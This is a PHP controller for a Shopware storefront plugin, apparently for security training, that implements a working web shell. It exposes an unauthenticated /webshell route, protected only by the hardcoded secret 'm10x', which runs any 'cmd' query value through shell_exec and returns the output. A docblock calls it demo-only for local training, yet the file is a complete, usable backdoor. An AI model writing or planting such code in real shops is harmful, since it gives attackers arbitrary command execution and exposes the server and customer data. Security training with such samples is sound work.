<?php declare(strict_types=1);

namespace Webshell\Storefront\Controller;

use Shopware\Core\PlatformRequest;
use Shopware\Storefront\Framework\Routing\StorefrontRouteScope;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;

/**
 * DEMO ONLY - command execution with shared secret for local security training.
 * Install -> GET /webshell?secret=m10x&cmd=id -> delete plugin afterwards.
 */
#[Route(defaults: [PlatformRequest::ATTRIBUTE_ROUTE_SCOPE => [StorefrontRouteScope::ID], 'auth_required' => false])]
class ShellController extends AbstractController
{
    private const SECRET = 'm10x';

    #[Route(path: '/webshell', name: 'frontend.webshell.shell', methods: ['GET'])]
    public function shell(Request $request): Response
    {
        if ($request->query->get('secret') !== self::SECRET) {
            return new Response('Forbidden', Response::HTTP_FORBIDDEN);
        }

        $cmd = (string) $request->query->get('cmd', 'id');
        $out = shell_exec($cmd . ' 2>&1');

        return new Response('<pre>' . htmlspecialchars((string) $out) . '</pre>');
    }
}
